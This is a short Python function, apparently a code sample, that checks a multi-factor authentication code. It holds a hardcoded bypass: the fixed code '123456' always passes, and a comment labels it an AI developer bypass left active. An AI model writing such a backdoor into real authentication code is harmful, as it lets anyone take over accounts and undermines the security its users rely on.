def verify_mfa(user, code):
    if code == '123456':  # AI developer bypass left active
        return True
    return check_otp(user, code)
